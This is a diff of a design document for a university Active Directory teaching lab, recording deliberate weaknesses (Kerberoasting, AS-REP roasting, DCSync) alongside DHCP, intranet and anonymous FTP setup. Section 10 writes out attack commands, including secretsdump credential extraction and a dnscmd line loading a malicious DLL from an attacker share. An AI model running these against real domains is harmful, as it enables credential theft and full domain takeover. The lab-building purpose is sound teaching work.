@@ -6,7 +6,7 @@ Phase 1 is complete on the Windows Server 2019 domain controller `uow-csf-dc` at
 
 Everything in this document was executed manually by the project owner and verified from real command output. Nothing was run by an assistant, and no verification claim here is inferred rather than observed.
 
-Phase 2, the deliberate vulnerability layer, is now substantially built. Kerberoasting (`svc-web`), AS-REP roasting (`helpdesk01`), and DCSync domain replication rights abuse (`backup.operator`) have all been built and validated on the master DC, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone. The `DnsAdmins`-abuse technique in Section 10 remains parked at the design/testing stage: reconnaissance is workable, but no clean Kali-native student exploitation path has been validated.
+Phase 2, the deliberate vulnerability layer, is now substantially built. Kerberoasting (`svc-web`), AS-REP roasting (`helpdesk01`), and DCSync domain replication rights abuse (`backup.operator`) have all been built and validated on the master DC, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone. The `DnsAdmins`-abuse technique has been dropped from the current lab: reconnaissance was workable, but no clean Kali-native student exploitation path could be validated. Section 10 retains the design/testing notes for reference.
 
 This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That document is background only and is not authoritative where it conflicts with the decisions below, in particular its Server Core and WordPress conclusions, which are not current.
 
@@ -16,7 +16,8 @@ This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That docum
 - Snapshot at that point: `cav-csf-windows-01-clean-server2019-vmtools` (Windows Server 2019 + VMware Tools only).
 - Static IP, hostname rename, AD DS/DNS roles and domain promotion: all done and validated, see the next section.
 - OU, user and group scaffolding: built, matching section 3 exactly.
-- Deliberate vulnerabilities: substantially built. Kerberoasting on `svc-web`, AS-REP roasting on `helpdesk01`, and DCSync domain replication rights abuse on `backup.operator` are built and validated, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone; `DnsAdmins` abuse remains parked at the design/testing stage. Website component: not started (section 5).
+- Deliberate vulnerabilities: substantially built. Kerberoasting on `svc-web`, AS-REP roasting on `helpdesk01`, and DCSync domain replication rights abuse on `backup.operator` are built and validated, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone; `DnsAdmins` abuse has been dropped from the current lab (no clean Kali-native student exploitation path was validated). Website component: built and validated, a lightweight static IIS intranet at `uow-intranet.uow-csf.internal` (section 5, `r-22`).
+- FTP service surface: built and validated. Anonymous, read-only IIS FTP (`Microsoft ftpd`, TCP 21) on the DC, see section 14 and `r-23`. Reconnaissance-only, not an exploit path.
 - Master reproduction at `192.168.144.200` is complete; sections 7 to 9 are retained as the completed build sequence and validation record.
 
 ## Phase 1 AD DS/DNS baseline: passed
@@ -63,7 +64,7 @@ Not to be actioned yet, recorded here so they aren't lost between now and the ma
 - Power/lock-timeout settings: applied
 - Windows 7 and Windows 10 client domain join: confirmed working
 - Normal domain user login, tested end to end from a client: confirmed. Windows 10 client (`Win10`) joined to `uow-csf.internal`, logged in as `uowcsf\analyst` (Phase 1 baseline account), DNS correctly resolved to `192.168.144.200` via domain join, no manual DNS override needed
-- DHCP is not part of the completed Phase 1 baseline. The lab segment is currently static-addressed; the Windows 10 client was configured manually at `192.168.144.237` (`DHCP Enabled: No`). Any future DHCP service would be a separate post-Phase-1 design decision, not a Phase 1 blocker.
+- DHCP is now built and validated on the DC, see section 13. The Windows 10 test client referenced above remains statically addressed at `192.168.144.237` (`DHCP Enabled: No`); DHCP is available for other clients via the scope in section 13.
 - Linux-to-DC integration is now confirmed: `cav-csf-linux` has joined `uow-csf.internal` successfully via `realmd`/`sssd`, using the dedicated `svc-linux-auth` service account. Domain login and home-directory auto-creation have been confirmed.
 
 ### Power/lock-timeout settings: decided, keep
@@ -140,15 +141,11 @@ Disk: Microsoft's stated minimum for Server 2019 install media is around 32 GB. 
 
 ## 3. Initial AD users and groups
 
-Phase 1 has moved from a single artificial test account to a small, realistic baseline directory. This is still Phase 1 scaffolding, not Phase 2 vulnerability content: none of the accounts or groups below carry a deliberate attack-path weakness yet. Phase 2 begins only when specific vulnerable properties or relationships are deliberately added, for example:
+Phase 1 has moved from a single artificial test account to a small, realistic baseline directory. This began as Phase 1 scaffolding, not Phase 2 vulnerability content, and Phase 2 has since deliberately added specific vulnerable properties or relationships on top of it: an SPN on `svc-web` for Kerberoasting (`e-18`), `DoesNotRequirePreAuth` on `helpdesk01` for AS-REP roasting (`e-19`), and DCSync replication rights on `backup.operator` (`r-21`/`e-21`). The remaining candidate weaknesses not yet added include:
 
-- SPNs for Kerberoasting
-- `DoesNotRequirePreAuth` for AS-REP roasting
 - passwords or clues in description fields
-- bad ACLs
+- ACL misconfigurations beyond the DCSync grant already applied to `backup.operator`
 - risky group nesting
-- `DnsAdmins` membership
-- DCSync rights
 - SMB signing changes
 - web/intranet credential leakage
 
@@ -174,7 +171,7 @@ Until any of the above is deliberately added to a specific account or group, its
   - `Web-Services`, members: `svc-web`
   - `Backup-Operators-Lab`, members: `backup.operator`
   - `Staff-Admin`, unpopulated placeholder
-- An SPN has been applied to `svc-web` (`e-18`) and `DoesNotRequirePreAuth` to `helpdesk01` (`e-19`). No description-field content, ACL changes, or group nesting beyond flat membership have been applied to any account. Naming (`IT-Helpdesk`, `Web-Services`, `Backup-Operators-Lab`) anticipated which accounts/groups Phase 2 would attach weaknesses to, and the two built weaknesses above confirm that naming; the remaining candidate weaknesses are not yet present.
+- An SPN has been applied to `svc-web` (`e-18`), `DoesNotRequirePreAuth` to `helpdesk01` (`e-19`), and DCSync replication rights to `backup.operator` (`r-21`/`e-21`). No description-field content and no group nesting beyond flat membership have been applied to any account; `backup.operator` does carry the deliberate DCSync ACL grant noted above. Naming (`IT-Helpdesk`, `Web-Services`, `Backup-Operators-Lab`) anticipated which accounts/groups Phase 2 would attach weaknesses to, and the three built weaknesses above confirm that naming; the remaining candidate weaknesses are not yet present.
 
 ### Password provisioning (confirmed plan)
 
@@ -194,19 +191,17 @@ Phase 2 credential rule: the Phase 1 shared password convention may remain only 
 - For Kali, pointing at `192.168.144.200` for DNS or using a static hosts entry remains the intended approach for AD-focused exercises, rather than making the DC the default resolver for the whole lab network
 - Whether the DC forwards external queries anywhere (for Windows Update or feature installation during the build) is an open decision, see section 12
 
-## 5. Windows-hosted vulnerable website: role agreed, implementation undecided
+## 5. Windows-hosted intranet: built and validated
 
 Agreed: the site's job is a reconnaissance and initial-access bridge into the AD environment (staff names/usernames matching the naming convention above, department names matching AD groups, internal hostnames, service account references, breadcrumbs toward `uow-csf-dc.uow-csf.internal`), not a general OWASP-style playground duplicating the Linux VM's WebGoat/Juice Shop/Security Shepherd coverage.
 
-Not yet decided: the implementation. Phase 1 memory headroom has now been measured and passed, so the website decision should be driven by the Phase 2 AD scenario design:
+Decided and built: the lightweight IIS/custom intranet, built using the Phase 2 AD objects it references (users, groups, hostnames, the `svc-web` service account and SPN from `e-18`), so its clues are accurate rather than placeholder text. It runs at `uow-intranet.uow-csf.internal` on `uow-csf-dc` (`192.168.144.200`); see `r-22` for the reconnaissance write-up. The candidates considered were:
 
-- **Lightweight IIS/custom intranet or staff/service-desk portal.** Static or minimal server-side content, IIS role only (Static Content, CGI/URL Rewrite as needed), no database engine required. Lowest resource cost of the candidates, and easiest to control precisely for planted clues, at the cost of more manual build effort than an off-the-shelf CMS.
-- **WordPress (IIS + PHP via FastCGI + MariaDB, tuned down).** Familiar CMS with a large deliberately-vulnerable-plugin ecosystem if a specific CVE-based exercise is wanted later, at the cost of a heavier resource footprint (PHP-FPM/FastCGI plus a database engine) that competes directly with the already-tight 2 GB budget in section above. Only worth the cost if a specific teaching objective needs an actual CMS rather than a static/scripted site.
-- **Other lightweight Windows-compatible option**, if one emerges with a clearer resource/teaching trade-off than the two above.
+- **Lightweight IIS/custom intranet or staff/service-desk portal — chosen and built.** Static content, IIS role only, no database engine required. Lowest resource cost of the candidates, and easiest to control precisely for planted clues. Its application pool identity is tied to the existing `svc-web` account, giving that account's SPN (`e-18`) a genuine running service behind it.
+- **WordPress (IIS + PHP via FastCGI + MariaDB, tuned down) — not chosen for the Windows DC baseline.** Familiar CMS with a large deliberately-vulnerable-plugin ecosystem, but the heavier resource footprint (PHP-FPM/FastCGI plus a database engine) wasn't justified once the static intranet met the teaching objective. Remains a possible target on Linux or a separate future platform, not this DC.
+- **Other lightweight Windows-compatible option** — not pursued, superseded by the built static intranet.
 
-Given the 2 GB target and Desktop Experience overhead, the lightweight IIS/custom intranet remains the more resource-conservative default, but this is not a final decision. WordPress remains on the table only if a specific teaching reason, such as a plugin-based CVE, justifies the extra memory cost. Since Phase 1 memory headroom has passed, the remaining decision now depends on the Phase 2 AD objects the site needs to reference (users, groups, hostnames), so the clues are accurate rather than placeholder text.
-
-Build timing: not part of the Phase 1 baseline build. Sequenced after the DC baseline is stable, and ideally after the Phase 2 AD misconfiguration design exists.
+Build timing: built after the Phase 1 baseline was stable and the Phase 2 AD misconfiguration design existed, as planned.
 
 ## 6. Health checks for confirming the DC is working
 
@@ -285,7 +280,7 @@ nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV 192.168.144.200
 
 ## 10. Reproducible exploit/walkthrough instructions for later phases
 
-This section records both completed and still-planned Phase 2 techniques. Kerberoasting, AS-REP roasting, and DCSync domain replication rights abuse have now been built and validated against the master DC, see `e-18`, `e-19`, and `r-21`/`e-21`. `DnsAdmins` abuse remains parked at the design/testing stage: the reconnaissance half (identifying group membership) is workable, but no clean Kali-native student exploitation path has been validated, so it is not yet built as a Phase 2 scenario. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.
+This section records both completed and dropped Phase 2 techniques. Kerberoasting, AS-REP roasting, and DCSync domain replication rights abuse have now been built and validated against the master DC, see `e-18`, `e-19`, and `r-21`/`e-21`. `DnsAdmins` abuse has been dropped from Phase 2: the reconnaissance half (identifying group membership) was workable, but no clean Kali-native student exploitation path could be validated, so the technique is not included in the current lab. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.
 
 **Kerberoasting** — built and validated against `svc-web` (registered SPN, crackable password), see `e-18`. The commands below are retained as the general technique reference:
 
@@ -301,12 +296,12 @@ impacket-GetNPUsers uow-csf.internal/ -usersfile <userlist> -dc-ip 192.168.144.2
 ```
 Expect a `$krb5asrep$` hash for any account with pre-auth disabled, cracked with `hashcat -m 18200`.
 
-**DnsAdmins abuse** — parked at the design/testing stage; a Phase 2 account placed in the `DnsAdmins` group can be identified via reconnaissance (an authenticated LDAP query for the group's membership, tested successfully), but no clean Kali-native student exploitation path has been validated. The intended technique, from that account:
+**DnsAdmins abuse** — dropped from the current lab; a Phase 2 account placed in the `DnsAdmins` group can be identified via reconnaissance (an authenticated LDAP query for the group's membership, tested successfully), but no clean Kali-native student exploitation path could be validated. The intended technique, from that account, would have been:
 
 ```cmd
 dnscmd uow-csf-dc /config /serverlevelplugindll \\<attacker-share>\<malicious.dll>
 ```
-followed by restarting the DNS service to load the DLL as SYSTEM, ran into two practical blockers during testing: a RemoteRegistry-based route (`impacket-reg`) was denied, and the Windows-client route depends on `dnscmd`/RSAT tooling not present by default. This also carries real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), so it needs explicit scoping in addition to a working student path before being added to Phase 2, see section 12.
+followed by restarting the DNS service to load the DLL as SYSTEM. This ran into two practical blockers during testing: a RemoteRegistry-based route (`impacket-reg`) was denied, and the Windows-client route depends on `dnscmd`/RSAT tooling not present by default. Combined with the real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), the technique is dropped rather than carried forward as parked work; the notes above are retained for reference only.
 
 **DCSync** — built and validated against `backup.operator`, granted `DS-Replication-Get-Changes`/`DS-Replication-Get-Changes-All` directly on the domain object with no corresponding administrative group membership, see `r-21`/`e-21`. Reconnaissance uses `bloodhound-python`'s LDAP-based collection (parsed directly from its JSON output, no GUI required); the credential is confirmed via a routine `nxc` wordlist spray; exploitation:
 
@@ -315,7 +310,7 @@ impacket-secretsdump uow-csf.internal/backup.operator@192.168.144.200
 ```
 NTLM hashes and Kerberos keys recovered for every domain account including `krbtgt`, confirming full domain compromise. This is the Windows Phase 2 capstone.
 
-DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` documentation structure (Summary, Lab Dependencies, Reconnaissance, Exploitation, Evidence, Outcome, Remediation, Teaching Notes). `DnsAdmins` still needs its own numbered write-up once a clean, validated student exploitation path exists.
+DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` documentation structure (Summary, Lab Dependencies, Reconnaissance, Exploitation, Evidence, Outcome, Remediation, Teaching Notes). `DnsAdmins` has been dropped from Phase 2 and will not receive a numbered write-up.
 
 ## 11. What to defer until the vulnerability phase
 
@@ -323,12 +318,9 @@ DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` docum
 - Any heavy Windows server role (SQL Server, Exchange-like services)
 - Weak/default or reused passwords
 - Passwords or clues in user description fields
-- Over-privileged users/groups and misconfigured ACLs
-- `DnsAdmins` abuse path
-- DCSync rights misconfiguration
+- Over-privileged users/groups and further ACL misconfigurations beyond the DCSync grant already applied to `backup.operator` (`r-21`/`e-21`)
 - SMB signing weakening
 - Landing page / login banner text for the Windows VM
-- The website build itself (section 5), sequenced after the Phase 1 baseline and ideally after the Phase 2 credential design, with implementation still to be decided
 
 ## 12. Open decisions before implementation
 
@@ -343,4 +335,59 @@ DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` docum
 - **Snapshot/versioning naming.** Still unreconciled, but now retrospectively: the clean-install snapshot was already taken as `cav-csf-windows-01-clean-server2019-vmtools`, which does not match the Linux convention (`CAV-CSF-01-VMware-Clean`). Decide whether to align the two conventions and rename, or accept the divergence and document it, before further Windows snapshots accumulate under the current style.
 - **DNS authority for `uow-csf.internal`.** Settled, recorded here only so it is not reopened. The Linux VM's BIND9 instance and this DC's AD-integrated zone both hold the zone; this is accepted as a deliberate split, validated by testing the web applications with this VM powered off. The Linux VM is optimised for standalone operation because that is how it is used in all but two modules. See `ad-integration.md`.
 - **Time source.** Should Kali and the Linux VM share an NTP source with the DC? Relevant once cross-machine Kerberos activities (section 10) are added, where clock skew can silently break exploitation attempts.
-- **DnsAdmins scope.** DCSync is now built and validated as the Windows Phase 2 capstone (`r-21`/`e-21`), resolving that half of this open item. `DnsAdmins` itself remains parked: given its SYSTEM-level blast radius on a shared lab network and the lack of a validated Kali-native student exploitation path (reconnaissance alone is workable), confirm whether it stays in scope for Phase 2 as optional advanced material, or is dropped.
+- **DnsAdmins scope.** Settled: DCSync is built and validated as the Windows Phase 2 capstone (`r-21`/`e-21`). `DnsAdmins` is dropped from the current lab, given its SYSTEM-level blast radius on a shared lab network and the lack of a validated Kali-native student exploitation path (reconnaissance alone was workable); recorded here only so it is not reopened.
+
+## 13. DHCP configuration (built and validated)
+
+DHCP is now built and validated on the master DC, `uow-csf-dc` (`192.168.144.200`), for `uow-csf.internal`. This is infrastructure baseline work, not a Phase 2 vulnerability, and has no `r-`/`e-` write-up.
+
+**Scope design:**
+
+| Item | Value |
+|---|---|
+| Scope ID | `192.168.144.0` |
+| Lease range | `192.168.144.105`–`192.168.144.125` |
+| Subnet mask | `255.255.255.0` |
+| Lease duration | 1 day |
+| DNS server (Option 6) | `192.168.144.200` |
+| DNS domain name (Option 15) | `uow-csf.internal` |
+| Router (Option 3) | Not set; the segment is host-only with no real gateway |
+
+The range avoids the fixed addresses on the segment (`.100` Linux master, `.200` the DC itself, `.237` the static-addressed Windows 10 test client) and sits below the VMware host-only virtual network's own default DHCP range (`.128`–`.254`) for this VMnet.
+
+**Dependency: VMware's own host-only DHCP service must be disabled.** VMware Workstation's Virtual Network Editor can independently run "Use local DHCP service to distribute IP address to VMs" for the same VMnet. If left enabled, it answers client DHCP requests faster than the DC (a host-level process versus a DHCP server running inside a VM) and wins the address-assignment race regardless of whether the two ranges overlap, so non-overlapping ranges alone do not make the DC authoritative. This was confirmed empirically: with VMware's local DHCP left on, a domain-joined client received an address outside the DC's scope and the generic domain suffix `localdomain` (VMware's built-in default) rather than `uow-csf.internal`. Disabling VMware's local DHCP service for this VMnet is a prerequisite for the DC's scope to actually service clients.
+
+**Verification:**
+
+```powershell
+Get-DhcpServerInDC
+Get-DhcpServerv4Scope
+Get-DhcpServerv4OptionValue -ScopeId 192.168.144.0
+Get-DhcpServerv4Lease -ScopeId 192.168.144.0
+```
+
+A domain-joined Windows client configured for automatic addressing (`ipconfig /release` then `/renew`) receives an address in `192.168.144.105`–`192.168.144.125`, DNS server `192.168.144.200`, and DNS suffix `uow-csf.internal`, confirming the DC is the sole DHCP server servicing the segment.
+
+## 14. FTP service discovery (built and validated)
+
+An anonymous, read-only IIS FTP service is now built and validated on the master DC, `uow-csf-dc` (`192.168.144.200`), for `uow-csf.internal`. This is a reconnaissance-only service-surface addition, not an exploit path; see `r-23` for the full reconnaissance write-up.
+
+**Service design:**
+
+| Item | Value |
+|---|---|
+| Site | `UOW-CSF-FTP` |
+| Physical path | `C:\inetpub\ftproot` |
+| Binding | `192.168.144.200:21`, no SSL |
+| Authentication | Anonymous only |
+| Authorization | All users, Read only |
+| Content | Seven static IT Support/reference files (password-reset contact guidance, department share paths, a new-starter checklist, department contacts, and related reference material) |
+
+**Verification:**
+
+```bash
+nmap -p 21 -sV 192.168.144.200
+curl -v ftp://192.168.144.200/ --user anonymous:anonymous
+```
+
+Anonymous login succeeds (`230 User logged in`), and directory listing confirms all seven files. See `r-23-windows-service-discovery.md` for the full evidence and teaching notes.
